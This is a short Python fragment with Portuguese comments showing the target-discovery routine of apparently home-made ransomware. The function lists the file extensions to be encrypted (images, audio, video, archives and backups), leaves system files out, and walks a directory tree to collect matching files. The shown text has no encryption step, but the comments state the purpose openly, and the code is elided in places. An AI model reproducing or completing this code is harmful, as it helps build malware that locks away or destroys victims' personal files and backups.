...
def discover (initial_path):
    ...
    # Extenções de possiveis alvos a serem encriptados
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz","img" #Arquivos do Sitema

        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', #imagens 'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape', # Audios
        'avi', 'flv', 'mp4', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Vídeos
        ...
        'zip', 'tar', 'tgz', 'bz2', '72', 'rar', 'bak', # Arquivos compactados e Backups
    ]
    
    for dirpath, dirs, files in os.walk (initial_path):
        for _file in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, _file))
            ext = absolute_path.split('.')[-1] # Pegar extenção do arquivo
